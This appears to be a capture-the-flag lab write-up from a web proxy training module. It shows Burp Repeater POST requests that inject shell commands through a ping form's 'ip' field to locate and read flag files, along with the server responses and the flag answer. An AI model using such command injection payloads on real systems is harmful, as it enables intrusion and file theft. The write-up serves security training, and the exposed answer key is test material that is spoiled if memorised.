# Section 07: Repeating Requests

Module: 14. Using Web Proxies

---

## Questions & Answers

### 1. Try using request repeating to be able to quickly test commands. With that, try looking for the other flag.

Context:
- Go to HTTP History and send a request to Repeater, find the flag files:
```
POST /ping HTTP/1.1
Host: 154.57.164.69:31675
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://154.57.164.69:31675/
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://154.57.164.69:31675
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ip=1;find / -type f -name "flag*" 2>/dev/null
```
- Result:
```
HTTP/1.1 200 OK
X-Powered-By: Express
Date: Tue, 25 Aug 2026 13:13:52 GMT
Connection: keep-alive
Content-Length: 774

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.050 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.050/0.050/0.050/0.000 ms
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.0/tty/ttyS0/flags
/sys/devices/virtual/net/ip6tnl0/flags
/sys/devices/virtual/net/sit0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/tunl0/flags
/sys/devices/virtual/net/eth0/flags
/var/www/html/flag.txt
/flag.txt
```
- Get the flag:
```
POST /ping HTTP/1.1
Host: 154.57.164.69:31675
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://154.57.164.69:31675/
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://154.57.164.69:31675
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ip=1;cat /flag.txt
```
- Result:
```
HTTP/1.1 200 OK
X-Powered-By: Express
Date: Tue, 25 Aug 2026 13:16:52 GMT
Connection: keep-alive
Content-Length: 283

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.048 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.048/0.048/0.048/0.000 ms
HTB{qu1ckly_r3p3471n6_r3qu3575}
```

**Answer:** `HTB{qu1ckly_r3p3471n6_r3qu3575}`

---

[Back to Module Index](./README.md)
